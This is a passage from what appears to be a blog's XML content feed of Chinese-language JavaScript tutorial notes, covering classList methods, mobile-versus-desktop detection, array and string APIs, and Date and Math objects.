<span class="string">&#x27;red&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 添加类名</span></span></span><br><span class="line"><span class="language-javascript">  box.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;add&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 切换类名,如果有该类名就移除该类名，如果没有就添加</span></span></span><br><span class="line"><span class="language-javascript">  box.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;div&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 移除类名</span></span></span><br><span class="line"><span class="language-javascript">  box.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;div&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 替换类名</span></span></span><br><span class="line"><span class="language-javascript">  box.<span class="property">classList</span>.<span class="title function_">replace</span>(<span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;newDiv&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript判断手机或电脑端</title>
    <url>/JavaScript/js-%E5%88%A4%E6%96%AD%E6%89%8B%E6%9C%BA%E6%88%96%E7%94%B5%E8%84%91%E7%AB%AF/</url>
    <content><![CDATA[<p>判断手机端和电脑端可以根据 <strong>屏幕大小</strong> 来判断，也可以使用 <strong>navigator</strong> 属性判断</p>
<p>1、判断代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isMobile</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="keyword">var</span> userAgentInfo = navigator.<span class="property">userAgent</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> mobileAgents = [<span class="string">&quot;Android&quot;</span>, <span class="string">&quot;iPhone&quot;</span>, <span class="string">&quot;SymbianOS&quot;</span>, <span class="string">&quot;Windows Phone&quot;</span>, <span class="string">&quot;iPad&quot;</span>, <span class="string">&quot;iPod&quot;</span>];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> mobile_flag = <span class="literal">false</span>;</span><br><span class="line">   </span><br><span class="line"> 	<span class="comment">//根据userAgent判断是否是手机</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> v = <span class="number">0</span>; v &lt; mobileAgents.<span class="property">length</span>; v++) &#123;</span><br><span class="line">       <span class="keyword">if</span> (userAgentInfo.<span class="title function_">indexOf</span>(mobileAgents[v]) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">             mobile_flag = <span class="literal">true</span>;</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> screen_width = <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">width</span>;</span><br><span class="line">    <span class="keyword">var</span> screen_height = <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">height</span>;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//根据屏幕分辨率判断是否是手机</span></span><br><span class="line">   <span class="keyword">if</span> (screen_width &gt; <span class="number">325</span> &amp;&amp; screen_height &lt; <span class="number">750</span>) &#123;</span><br><span class="line">       mobile_flag = <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> mobile_flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2、插入样式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mobile_flag = <span class="title function_">isMobile</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> link = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;link&quot;</span>);</span><br><span class="line">link.<span class="property">rel</span> = <span class="string">&#x27;stylesheet&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断手机端或移动端在头部插入 css 样式</span></span><br><span class="line"><span class="keyword">var</span> head = <span class="variable language_">document</span>.<span class="property">head</span>;</span><br><span class="line"><span class="keyword">if</span> (mobile_flag) &#123;</span><br><span class="line">	link.<span class="property">href</span> = <span class="string">&#x27;./css/mobile.css&#x27;</span>;</span><br><span class="line">    head.<span class="title function_">appendChild</span>(link);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	link.<span class="property">href</span> = <span class="string">&#x27;./css/pc.css&#x27;</span>;</span><br><span class="line">    head.<span class="title function_">appendChild</span>(link);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本文做了一些自己的修改，如果希望查看原文，请转：<a href="https://www.cnblogs.com/dalaowang/p/10315419.html">https://www.cnblogs.com/dalaowang/p/10315419.html</a></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
  </entry>
  <entry>
    <title>js笔记-数组和字符串API</title>
    <url>/JavaScript/js-%E6%95%B0%E7%BB%84%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h3 id="常见数组API">常见数组API</h3>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">push()</td>
<td style="text-align:left">往数组的尾部插入一个或多个元素</td>
</tr>
<tr>
<td style="text-align:left">pop()</td>
<td style="text-align:left">从数组的尾部删除一个元素</td>
</tr>
<tr>
<td style="text-align:left">unshift()</td>
<td style="text-align:left">往数组的头部插入一个或多个元素</td>
</tr>
<tr>
<td style="text-align:left">shift()</td>
<td style="text-align:left">从数组的头部删除一个元素</td>
</tr>
<tr>
<td style="text-align:left">slice()</td>
<td style="text-align:left">裁切数组</td>
</tr>
<tr>
<td style="text-align:left">splice()</td>
<td style="text-align:left">删除或替换数组某个元素</td>
</tr>
<tr>
<td style="text-align:left">concat()</td>
<td style="text-align:left">连接一个或多个数组, 不会修改原数组, 会返回连接出来的新数组</td>
</tr>
<tr>
<td style="text-align:left">join()</td>
<td style="text-align:left">以特定的连接符将一个数组连接成字符串, 不会修改原数组</td>
</tr>
<tr>
<td style="text-align:left">reverse()</td>
<td style="text-align:left">反转数组</td>
</tr>
</tbody>
</table>
<h3 id="常见字符串API">常见字符串API</h3>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">charAt()</td>
<td style="text-align:left">获取指定下标的字符</td>
</tr>
<tr>
<td style="text-align:left">charCodeAt()</td>
<td style="text-align:left">如果不传参数, 把第0个字符转unicode编码</td>
</tr>
<tr>
<td style="text-align:left">String.fromCharCode()</td>
<td style="text-align:left">静态方法,把unicode编码转成字符</td>
</tr>
<tr>
<td style="text-align:left">substring()</td>
<td style="text-align:left">裁切字符串,从开始下标裁切到结束下标,结束下标裁切不到</td>
</tr>
<tr>
<td style="text-align:left">split()</td>
<td style="text-align:left">把字符串切割成数组</td>
</tr>
<tr>
<td style="text-align:left">repeat()</td>
<td style="text-align:left">重复一个字符串n次</td>
</tr>
<tr>
<td style="text-align:left">trim()</td>
<td style="text-align:left">去除字符串左右两边的空格, 中间的空格则不做处理</td>
</tr>
<tr>
<td style="text-align:left">toLowerCase()</td>
<td style="text-align:left">把字符串转小写</td>
</tr>
<tr>
<td style="text-align:left">toUpperCase()</td>
<td style="text-align:left">把字符串转大写</td>
</tr>
<tr>
<td style="text-align:left">replace()</td>
<td style="text-align:left">替换</td>
</tr>
<tr>
<td style="text-align:left">indexOf()</td>
<td style="text-align:left">从头部开始检索下标</td>
</tr>
<tr>
<td style="text-align:left">lastIndexOf()</td>
<td style="text-align:left">从尾部开始检索下标</td>
</tr>
</tbody>
</table>
<h3 id="用法">用法</h3>
<h4 id="1-数组API">1.数组API</h4>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">push</span>(<span class="number">4</span>);    <span class="comment">// 修改原数组,返回新数组长度 4,arr = [1, 2, 3, 4]</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">pop</span>();      <span class="comment">// 修改原数组,返回被删除的元素 4,arr = [1, 2, 3]</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">unshift</span>(<span class="number">0</span>); <span class="comment">// 修改原数组,返回新数组长度 4,arr = [0, 1, 2, 3]</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">shift</span>();    <span class="comment">// 修改原数组,返回被删除的元素 0,arr = [1, 2, 3]</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">2</span>); <span class="comment">// 不会修改原数组,返回被裁切出来的数组 [1, 2],arr = [1, 2, 3]</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">slice</span>(<span class="number">1</span>);   <span class="comment">// 如果只有一个参数, 则作为开始下标 裁切到数组尾部</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">splice</span>(<span class="number">1</span>,<span class="number">2</span>);<span class="comment">// 会修改原数组,返回切割出来的数组 [2, 3],arr = [1]</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">splice</span>(<span class="number">1</span>);  <span class="comment">// 如果只有一个参数, 则作为开始裁切的下标, 裁切到数组尾部</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">splice</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>); <span class="comment">// 替换,newArr=[1, 2],arr=[1, 0, 0] </span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">concat</span>([<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]); <span class="comment">// 不会修改原数组,会返回连接出来的新数组 [1,2,3,4,5,6]</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">join</span>(<span class="string">&quot;-&quot;</span>);  <span class="comment">// 不会修改原数组, 返回连接过后的新字符串 1-2-3-4-5-6</span></span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">reverse</span>();  <span class="comment">// 会修改原数组,返回反转过后的数组 [6,5,4,3,2,1]</span></span><br></pre></td></tr></table></figure>
<h4 id="2-filter-过滤">2.filter 过滤</h4>
<p>创建一个新的数组，新数组中的元素是通过检查指定数组中符合条件的所有元素</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>];</span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">filter</span>(<span class="keyword">function</span> (<span class="params">ele, i, arr</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;数组的每一项 =&gt;&quot;</span>, ele);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;数组的下标 =&gt;&quot;</span>, i);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;数组本身 =&gt;&quot;</span>, arr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 筛选符合条件的部分</span></span><br><span class="line">    <span class="keyword">if</span> (ele % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 函数执行的结果为true, 则当前元素就是过滤出来的元素, 会返回成新数组</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;筛选出来的数组 =&gt;&quot;</span>, newArr); <span class="comment">// [2，4，6，8，10];</span></span><br></pre></td></tr></table></figure>
<h4 id="3-map-迭代">3.map 迭代</h4>
<p>把数组中的每一项，经过函数的处理以后,返回成新的数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>];</span><br><span class="line"><span class="keyword">var</span> newArr = arr.<span class="title function_">map</span>(<span class="keyword">function</span> (<span class="params">e, i, arr</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;数组的每一项 =&gt;&quot;</span>, e);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;数组的下标 =&gt;&quot;</span>, i);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;数组本身 =&gt;&quot;</span>, arr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把每一个元素 放大两倍, 然后返回成新的数组</span></span><br><span class="line">    e = e * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> e;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;新数组 =&gt;&quot;</span>, newArr); <span class="comment">//  [3, 5, 7, 9, 11, 13, 15, 17, 19, 21]</span></span><br></pre></td></tr></table></figure>
<h4 id="4-forEach-遍历">4.forEach 遍历</h4>
<p>用于调用数组的每一个元素，并将元素传递给回调函数，不支持 return ,没有返回值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>];</span><br><span class="line"><span class="keyword">var</span> newArrr = arr.<span class="title function_">forEach</span>( <span class="keyword">function</span>(<span class="params">ele, i, arr</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;数组的每一项 =&gt;&quot;</span>, ele);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;数组的下标 =&gt;&quot;</span>, i);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;数组本身 =&gt;&quot;</span>, arr);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(newArr); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<h4 id="5-字符串API">5.字符串API</h4>
<p>注意：字符串的API, 不会修改原字符串, 都是返回新的字符串 (split方法返回数组)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;hello wolrd&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">charAt</span>(<span class="number">0</span>);     <span class="comment">// 获取下标值 h</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">charCodeAt</span>(<span class="number">0</span>); <span class="comment">// 获取下标值并转换为unicode编码 104 </span></span><br><span class="line"><span class="keyword">var</span> newStr = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">104</span>);  <span class="comment">// 把unicode编码转成字符 h</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">substring</span>(<span class="number">1</span>,<span class="number">4</span>);<span class="comment">// 裁切字符串,从开始下标裁切到结束下标,结束下标裁切不到 ell</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>);    <span class="comment">// 把字符串切割成数组 [&quot;hello&quot;, &quot;wolrd&quot;]</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">repeat</span>(<span class="number">2</span>);     <span class="comment">// 重复字符串 hello wolrdhello wolrd</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">trim</span>();        <span class="comment">// 去除字符串左右两边的空格 hello wolrd</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">toLowerCase</span>(); <span class="comment">// 把字符串转小写 hello wolrd</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">toUpperCase</span>(); <span class="comment">// 把字符串转大写 HELLO WOLRD</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">replace</span>(<span class="string">&quot;h&quot;</span>,<span class="string">&quot;w&quot;</span>); <span class="comment">// 替换 wello Wolrd</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">indexOf</span>(<span class="string">&quot;h&quot;</span>);     <span class="comment">// 从头部开始检索下标 0</span></span><br><span class="line"><span class="keyword">var</span> newStr = str.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;l&quot;</span>); <span class="comment">// 从尾部开始检索下标 8</span></span><br></pre></td></tr></table></figure>
<h3 id="例子">例子</h3>
<h4 id="1-把手机号码的中间4位替换成">1.把手机号码的中间4位替换成 ****</h4>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> phone = <span class="string">&quot;13922297693&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> newPhone = phone.<span class="title function_">replace</span>(phone.<span class="title function_">slice</span>(<span class="number">3</span>,<span class="number">7</span>),<span class="string">&quot;*&quot;</span>.<span class="title function_">repeat</span>(<span class="number">4</span>)); <span class="comment">// 139****7693</span></span><br></pre></td></tr></table></figure>
<h4 id="2-创建一个替换字符串函数replaceString">2.创建一个替换字符串函数replaceString</h4>
<p>函数接收三个参数 oldS旧字符, newS新字符, fullS完整字符串<br>
函数返回一个新字符串，要求将完整字符串中所有旧字符替换成新字符</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">replaceString</span>(<span class="params">olds, news, fulls</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果完成字符串中还有旧字符串,继续循环</span></span><br><span class="line">    <span class="keyword">while</span>(fulls.<span class="title function_">indexOf</span>(olds) != -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">// 旧字符串的下标</span></span><br><span class="line">        <span class="keyword">var</span> i = fulls.<span class="title function_">indexOf</span>(olds);</span><br><span class="line">        <span class="comment">// 旧字符串的长度</span></span><br><span class="line">        <span class="keyword">var</span> len = olds.<span class="property">length</span>; </span><br><span class="line">        <span class="comment">// 新的字符串</span></span><br><span class="line">        fulls =  fulls.<span class="title function_">slice</span>(<span class="number">0</span>,i) + news + fulls.<span class="title function_">slice</span>(i+len);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fulls;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> str = <span class="title function_">replaceString</span>(<span class="string">&quot;World&quot;</span>, <span class="string">&quot;Web&quot;</span>, <span class="string">&quot;Hello World&quot;</span>); <span class="comment">// Hello Web</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript笔记大全</title>
    <url>/JavaScript/js-%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<p>本文JavaScript笔记用于平常查阅使用</p>
<h1>一、Date（日期） 对象</h1>
<p>日期对象用于处理日期和时间。</p>
<h2 id="1-get方法">1. get方法</h2>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">getFullYear()</td>
<td style="text-align:left">获取年份</td>
</tr>
<tr>
<td style="text-align:left">getMonth()</td>
<td style="text-align:left">获取月份</td>
</tr>
<tr>
<td style="text-align:left">getDate()</td>
<td style="text-align:left">获取日期</td>
</tr>
<tr>
<td style="text-align:left">getDay()</td>
<td style="text-align:left">获取星期几</td>
</tr>
<tr>
<td style="text-align:left">getHours()</td>
<td style="text-align:left">获取小时</td>
</tr>
<tr>
<td style="text-align:left">getMinutes()</td>
<td style="text-align:left">获取分钟</td>
</tr>
<tr>
<td style="text-align:left">getSeconds()</td>
<td style="text-align:left">获取秒钟</td>
</tr>
<tr>
<td style="text-align:left">getMilliseconds()</td>
<td style="text-align:left">获取毫秒</td>
</tr>
<tr>
<td style="text-align:left">getTime()</td>
<td style="text-align:left">获取1970年至今的毫秒数  同 Date.now()</td>
</tr>
</tbody>
</table>
<h2 id="2-to方法">2. to方法</h2>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">toString()</td>
<td style="text-align:left">把日期对象转字符串</td>
</tr>
<tr>
<td style="text-align:left">toLocaleString()</td>
<td style="text-align:left">把日期对象转成符合当地习惯的字符串</td>
</tr>
<tr>
<td style="text-align:left">toDateString()</td>
<td style="text-align:left">把时间对象的日期部分转字符串</td>
</tr>
<tr>
<td style="text-align:left">toLocaleDateString()</td>
<td style="text-align:left">把时间对象的日期部分转成符合当地习惯的字符串</td>
</tr>
<tr>
<td style="text-align:left">toTimeString()</td>
<td style="text-align:left">把时间对象的时间部分转字符串</td>
</tr>
<tr>
<td style="text-align:left">toLocaleTimeString()</td>
<td style="text-align:left">把时间对象的时间部分转成符合当地习惯的字符串</td>
</tr>
<tr>
<td style="text-align:left">toUTCString()</td>
<td style="text-align:left">把日期对象转UTC时间字符串</td>
</tr>
</tbody>
</table>
<h2 id="3-set方法">3.set方法</h2>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">setFullYear()</td>
<td style="text-align:left">设置年份</td>
</tr>
<tr>
<td style="text-align:left">setMonth()</td>
<td style="text-align:left">设置月份</td>
</tr>
<tr>
<td style="text-align:left">setDate()</td>
<td style="text-align:left">设置日期</td>
</tr>
<tr>
<td style="text-align:left">setHours()</td>
<td style="text-align:left">设置小时</td>
</tr>
<tr>
<td style="text-align:left">setMinutes()</td>
<td style="text-align:left">设置分数</td>
</tr>
<tr>
<td style="text-align:left">setSeconds()</td>
<td style="text-align:left">设置秒数</td>
</tr>
<tr>
<td style="text-align:left">setMilliseconds()</td>
<td style="text-align:left">设置毫秒</td>
</tr>
</tbody>
</table>
<p>创建时间对象:</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>(); </span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>(dateString); </span><br></pre></td></tr></table></figure>
<p>代码如下（以“2022-1-14 09:58:27 星期五” 为例）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 实例时间对象</span></span><br><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// get</span></span><br><span class="line"><span class="keyword">var</span> year = date.<span class="title function_">getFullYear</span>();  <span class="comment">// 2022</span></span><br><span class="line"><span class="keyword">var</span> month = date.<span class="title function_">getMonth</span>()+<span class="number">1</span>;  <span class="comment">// 默认月份从 0 开始，所以要 +1 ，结果为: 1</span></span><br><span class="line"><span class="keyword">var</span> newDate = date.<span class="title function_">getDate</span>();  <span class="comment">// 14</span></span><br><span class="line"><span class="keyword">var</span> day = date.<span class="title function_">getDay</span>();  <span class="comment">// 5</span></span><br><span class="line"><span class="keyword">var</span> hours = date.<span class="title function_">getHours</span>();  <span class="comment">// 9</span></span><br><span class="line"><span class="keyword">var</span> minutes = date.<span class="title function_">getMinutes</span>(); <span class="comment">// 58</span></span><br><span class="line"><span class="keyword">var</span> seconds = date.<span class="title function_">getSeconds</span>(); <span class="comment">// 27</span></span><br><span class="line"><span class="keyword">var</span> milliseconds = date.<span class="title function_">getMilliseconds</span>(); <span class="comment">// 735</span></span><br><span class="line"><span class="keyword">var</span> time = date.<span class="title function_">getTime</span>(); <span class="comment">// 1642125892270</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// to</span></span><br><span class="line"><span class="keyword">var</span> toString = date.<span class="title function_">toString</span>();  <span class="comment">// typeof strTime = &quot;String&quot;</span></span><br><span class="line"><span class="keyword">var</span> toLocaleString = date.<span class="title function_">toLocaleString</span>();  <span class="comment">// 2022/1/14 上午9:58:27</span></span><br><span class="line"><span class="keyword">var</span> toDateString = date.<span class="title function_">toDateString</span>();  <span class="comment">// Fri Jan 14 2022</span></span><br><span class="line"><span class="keyword">var</span> toLocaleDateString = date.<span class="title function_">toLocaleDateString</span>(); <span class="comment">// 2022/1/14</span></span><br><span class="line"><span class="keyword">var</span> toTimeString = date.<span class="title function_">toTimeString</span>();  <span class="comment">// 09:58:27 GMT+0800 (中国标准时间)</span></span><br><span class="line"><span class="keyword">var</span> toLocaleTimeString = date.<span class="title function_">toLocaleTimeString</span>(); <span class="comment">// 上午9:58:27</span></span><br><span class="line"><span class="keyword">var</span> toUTCString = date.<span class="title function_">toUTCString</span>(); <span class="comment">// Fri, 14 Jan 2022 02:45:38 GMT</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// set</span></span><br><span class="line">date.<span class="title function_">setFullYear</span>(<span class="number">2024</span>);</span><br><span class="line">date.<span class="title function_">setMonth</span>(<span class="number">1</span>);</span><br><span class="line">date.<span class="title function_">setDate</span>(<span class="number">19</span>);</span><br><span class="line">date.<span class="title function_">setHours</span>(<span class="number">08</span>);</span><br><span class="line">date.<span class="title function_">setMinutes</span>(<span class="number">00</span>);</span><br><span class="line">date.<span class="title function_">setSeconds</span>(<span class="number">00</span>);</span><br><span class="line">date.<span class="title function_">setMilliseconds</span>(<span class="number">00</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(date);  <span class="comment">// Mon Feb 19 2024 08:00:00 GMT+0800 (中国标准时间)</span></span><br></pre></td></tr></table></figure>
<br>
<h1>二、Math / 随机生成</h1>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">ceil()</td>
<td style="text-align:left">对数进行上舍入，即向上取整</td>
</tr>
<tr>
<td style="text-align:left">round()</td>
<td style="text-align:left">四舍五入</td>
</tr>
<tr>
<td style="text-align:left">foor()</td>
<td style="text-align:left">对 x 进行下舍入，即向下取整</td>
</tr>
<tr>
<td style="text-align:left">random()</td>
<td style="text-align:left">返回 0 ~ 1 之间的随机数，包含 0 不包含 1</td>
</tr>
</tbody>
</table>
<p>代码如下（获取从 1 到 10 的随机整数，取 0 的概率极小）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Math</span>.<span class="title function_">ceil</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">10</span>) </span><br></pre></td></tr></table></figure>
<p>代码如下（可均衡获取 0 到 1 的随机整数）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Math</span>.<span class="title function_">round</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>())</span><br></pre></td></tr></table></figure>
<p>代码如下（可均衡获取 0 到 9 的随机整数）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<p>代码如下（基本均衡获取 0 到 10 的随机整数，其中获取最小值 0 和最大值 10 的几率少一半）</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Math</span>.<span class="title function_">round</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">10</span>) </span><br></pre></td></tr></table></figure>
<br>
<h1>三、数组API</h1>
<p>数组对象的作用是：使用单独的变量名来存储一系列的值。</p>
<h2 id="1-数组API">1.数组API</h2>
<table>
<thead>
<tr>
<th style="text-align:left">属性</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">push()</td>
<td style="text-align:left">往数组的尾部插入一个或多个元素</td>
</tr>
<tr>
<td style="text-align:left">pop()</td>
<td style="text-align:left">从数组的尾部删除一个元素</td>
</tr>
<tr>
<td style="text-align:left">unshift()</td>
<td style="text-align:left">往数组的头部插入一个或多个元素</td>
</tr>
<tr>
<td style="text-align:left">shift()</td>
<td style="text-align:left">从数组的头部删除一个元素</td>
</tr>
<tr>
<td style="text-align:left">slice()</td>
<td style="text-align:left">裁切数组</td>
</tr>
<tr>
<td style="text-align:left">splice()</td>
<td style="text-align:left">删除或替换数组某个元素</td>
</tr>
<tr>
<td style="text-align:left">concat()</td>
<td style="text-align:left">连接一个或多个数组, 不会修改原数组, 会返回连接出来的新数组</td>
</tr>
<tr>
<td style="text-align:left">join()</td>
<td style="text-align:left">以特定的连接符将一个数组连接成字符串, 不会修改原数组</td>
</tr>
<tr>
<td style="text-align:left">reverse()</td>
<td style="text-align:left">反转数组</td>
</tr>
</tbody>
</table>
<p>代码如下（例子）</p>
